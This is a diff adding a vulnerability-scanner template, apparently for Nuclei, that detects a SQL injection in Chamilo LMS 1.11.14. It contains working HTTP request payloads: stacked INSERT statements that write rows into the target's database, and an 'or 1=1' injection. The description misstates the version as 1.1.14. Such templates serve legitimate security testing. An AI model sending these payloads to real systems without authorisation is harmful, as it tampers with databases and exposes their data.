@@ -1,0 +1,37 @@
+id: chamilo-lms-sqli
+
+info:
+  name: Chamilo 1.11.14 - SQL Injection
+  author: undefl0w
+  severity: critical
+  description: Chamilo 1.1.14 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+  reference: https://packetstormsecurity.com/files/162572/Chamilo-LMS-1.11.14-Remote-Code-Execution.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 2
+  tags: chamilo,sqli
+
+http:
+  - raw:
+      - |
+        POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=image&field_id=image&tag=image&from=image&search=image&options=["test'); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,'{{randstr}}'); INSERT INTO extra_field_options(option_value) VALUES ('{{randstr}}'); INSERT INTO tag (id, tag, field_id,count) VALUES(16, '{{randstr}}', 16,0) ON DUPLICATE KEY UPDATE     tag='{{randstr}}', field_id=16, count=0;  -- "]
+      - |
+        POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{randstr}}")'
+
+# digest: 4a0a00473045022100f0763c495f03e4bb47b503aa9932109ffe88eb5a1b84f7c5eb4675461b91400a022009f4e49b90c4d282dd86bf980bb684286af4e1473a926dbf31dde32ba5c17e2f:922c64590222798bb761d5b6d8e72950
